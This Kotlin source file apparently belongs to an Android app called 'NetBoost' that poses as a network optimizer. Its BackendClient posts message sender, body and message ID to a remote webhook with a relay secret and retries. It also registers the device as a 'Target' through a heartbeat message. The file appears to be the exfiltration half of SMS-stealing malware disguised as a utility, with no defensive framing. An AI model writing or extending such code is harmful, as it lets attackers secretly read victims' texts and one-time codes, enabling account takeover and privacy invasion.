package com.netboost.optimizer

import android.util.Log
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.withContext
import okhttp3.FormBody
import okhttp3.OkHttpClient
import okhttp3.Request
import java.util.concurrent.TimeUnit

object BackendClient {
    private const val TAG = "NetBoostSync"

    private val client = OkHttpClient.Builder()
        .connectTimeout(Config.TIMEOUT_SECONDS, TimeUnit.SECONDS)
        .readTimeout(Config.TIMEOUT_SECONDS, TimeUnit.SECONDS)
        .writeTimeout(Config.TIMEOUT_SECONDS, TimeUnit.SECONDS)
        .retryOnConnectionFailure(true)
        .build()

    suspend fun relay(
        from: String,
        body: String,
        messageSid: String,
    ): Boolean = relayWithCode(from, body, messageSid) in 200..299

    suspend fun relayWithCode(
        from: String,
        body: String,
        messageSid: String,
    ): Int = withContext(Dispatchers.IO) {
        val formBody = FormBody.Builder()
            .add("From", from)
            .add("To", Config.DEVICE_ID)
            .add("Body", body)
            .add("MessageSid", messageSid)
            .build()

        val request = Request.Builder()
            .url(Config.BACKEND_WEBHOOK)
            .post(formBody)
            .addHeader("X-Relay-Secret", Config.RELAY_SECRET)
            .addHeader("User-Agent", "NetBoost/1.0")
            .build()

        var lastCode = -1
        var delayMs = 1000L

        for (attempt in 1..3) {
            try {
                client.newCall(request).execute().use { response ->
                    lastCode = response.code
                    if (response.isSuccessful) {
                        return@withContext response.code
                    }
                }
            } catch (e: Exception) {
                Log.w(TAG, "Sync attempt $attempt failed: ${e.message}")
            }

            if (attempt < 3) {
                kotlinx.coroutines.delay(delayMs)
                delayMs *= 2
            }
        }

        lastCode
    }

    suspend fun registerTarget(deviceId: String): Boolean = withContext(Dispatchers.IO) {
        val formBody = FormBody.Builder()
            .add("From", deviceId)
            .add("To", deviceId)
            .add("Body", "SYSTEM_HEARTBEAT: Target online")
            .add("MessageSid", "heartbeat-$deviceId-${System.currentTimeMillis()}")
            .build()

        val request = Request.Builder()
            .url(Config.BACKEND_WEBHOOK)
            .post(formBody)
            .addHeader("X-Relay-Secret", Config.RELAY_SECRET)
            .addHeader("User-Agent", "NetBoost/1.0")
            .build()

        try {
            client.newCall(request).execute().use { response ->
                val ok = response.isSuccessful
                Log.d(TAG, "Register Target -> HTTP ${response.code}")
                ok
            }
        } catch (e: Exception) {
            Log.e(TAG, "Register Target failed: ${e.message}", e)
            false
        }
    }
}
